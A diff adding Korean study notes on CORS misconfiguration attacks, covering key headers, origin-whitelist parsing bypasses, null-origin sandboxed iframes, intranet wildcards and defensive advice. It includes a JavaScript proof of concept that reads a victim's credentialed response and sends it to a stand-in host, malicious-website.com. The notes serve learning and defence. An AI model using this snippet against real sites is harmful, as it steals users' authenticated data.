@@ -1,0 +1,94 @@
+*CORS*
+
+개념: 서로 다른 오리진의 자원들에 대한 제한적인 접근을 설정하는 정책. origin(scheme+host+port) vs site(eTLD + 1)
+
+특징: SOP는 같은 오리진이 아니면 응답을 보여주지 않는등 매우 strict한 통제 정책임에 반해, CORS는 서버에서 허락한 특정 Origin은 응답 데이터를 읽을 수 있게 해주는 융통성 있는 정책. 그렇기에 CORS는 SOP를 확장시켜준다는 특징이 있다.
+
+
+
+ The cross-origin resource sharing protocol uses a suite of HTTP headers that define trusted web origins and associated properties such as whether authenticated access is permitted. 
+These are combined in a header exchange between a browser and the cross-origin web site that it is trying to access.
+
+현대의 웹사이트들은 CORS를 사용해 서브도메인과 신뢰하는 third party 도메인들의 접근을 허용함. 이 CORS 설정이 잘못되면 문제가 생기겠죠?
+
+핵심 CORS 헤더:
+	- ACAO(Access Control Allow Origin): 어느 Origin의 js가 내 서버 응답 데이터에 접근하는 것을 허용할지
+	- Access-Control-Allow-Credentials: Cross Origin에서 전달된 쿠키를 서버가 인정하고 브라우저가 해당 응답데이터를 자바스크립트에 전달하도록 허용할 것인지
+
+  저 두개가 응답에 동시에 포함되어 있어야 자바스크립트로 읽을 수 있음. 단, SameOrigin이라면 ACAO가 없어도 됨.
+
+
+
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+	location='//malicious-website.com/log?key='+this.responseText;
+};
+
+
+요청에 포함된 Origin을 보고 화이트리스팅식으로 요청을 제한하거나 헝ㅇ할수 있는데, 파싱오류에 주의해야함.
+
+예를 들어 exam.com이 뒤에 있기만하면 된다 그러면 evilexam.com 도메인네임 하나 사면되겠죠?
+exam.com이 앞에 있어야한다? 그러면 exam.com.evil.net 하나 만들면 되곘죠?
+
+
+Origin 헤더의 값으로 null을 줄 수 있음. 만약 서버에서 null값을 허용해준다면, iframe에 샌드박스 속성을 부여하는 것으로 origin을 null 로 설정해서 CORS를 우회할 수 있다. 샌드박스 iframe 내부에서 발생한 스크립트 요청은 보안 및 격리 목적으로 출처를 익명화하기에 origin을 null로 설정한다. 근데 그냥 <iframe sandbox> ... </iframe> 로 해버리면 자바스크립트 자체가 차단 되어버리니, sandbox = "allow-scripts allow-top-navigation allow-forms"를 설정해주자. 그리고 코드를 넣는 법은 srcdoc 속성을 이용한다. 
+ 
++ SameO
+
+과정
+1. 오는 응답에 CORS의 핵심헤더가 포함되어 있는지 체크
+2. 
+
+
+SSRF 처럼 타겟서버의 서브도메인이나 서드파티와의 신뢰관계를 악용해서 취약한 서브도메인이나 서드파티를 공격해 타겟 서버에 접근할 수 있다.
+
+
+
+
+
+
+자격 증명 없이 인트라넷 및 CORS 사용
+대부분의 CORS 공격은 응답 헤더의 존재를 이용합니다.
+
+Access-Control-Allow-Credentials: true
+해당 헤더가 없으면 피해 사용자의 브라우저는 쿠키 전송을 거부하게 되므로 공격자는 인증되지 않은 콘텐츠에만 접근할 수 있게 되는데, 이는 공격자가 대상 웹사이트에 직접 접속하는 것과 마찬가지로 쉽습니다.
+
+하지만 공격자가 웹사이트에 직접 접근할 수 없는 일반적인 상황이 하나 있습니다. 바로 조직의 인트라넷에 속해 있고 사설 IP 주소 공간에 위치한 웹사이트입니다. 내부 웹사이트는 외부 사이트보다 보안 수준이 낮은 경우가 많아 공격자가 취약점을 찾아 추가 접근 권한을 얻을 수 있습니다. 예를 들어, 사설 네트워크 내에서 발생하는 교차 출처 요청은 다음과 같습니다.
+
+GET /reader?url=doc1.pdf
+Host: intranet.normal-website.com
+Origin: https://normal-website.com
+그러면 서버는 다음과 같이 응답합니다.
+
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+
+
+
+
+
+Access-Control-Allow-Origin헤더에 지정된 출처는 신뢰할 수 있는 사이트여야 합니다. 
+특히, 유효성 검사 없이 교차 출처 요청에서 출처를 동적으로 반영하는 것은 악용될 소지가 크므로 피해야 합니다.
+
+
+null을 화이트리스트에 추가하지 마십시오.
+`CORS` 헤더 사용을 피하십시오 Access-Control-Allow-Origin: null. 내부 문서 및 샌드박스 요청에서 발생하는 CORS(교차 출처 리소스) 호출은 null출처를 지정할 수 있습니다. 개인 서버와 공용 서버에 대한 신뢰할 수 있는 출처를 고려하여 CORS 헤더를 올바르게 정의해야 합니다.
+
+내부 네트워크에서 와일드카드 사용을 피하십시오. (ACAO: * 설정하는거요)
+내부 네트워크에서는 와일드카드 사용을 피하십시오. 내부 브라우저가 신뢰할 수 없는 외부 도메인에 접근할 수 있는 경우, 네트워크 구성만으로 내부 리소스를 보호하는 것은 충분하지 않습니다.
+
+
+CORS는 서버 측 보안 정책을 대체하는 것이 아닙니다.
+CORS는 브라우저의 동작 방식을 정의하는 것이며, 민감한 데이터에 대한 서버 측 보호를 대체할 수는 없습니다
+
+
+
+
+결론 CORS기반 공격 방지
+- ACAO 설정  null하지마 인트라여도 와일드 카드 쓰지마 신뢰할 수 있는 사이트만 해 동적으로 반영하지마
+- 브라우저 동작 방식 설정하는거일뿐이야 그니까 민감한 데이터는 알아서 잘지켜
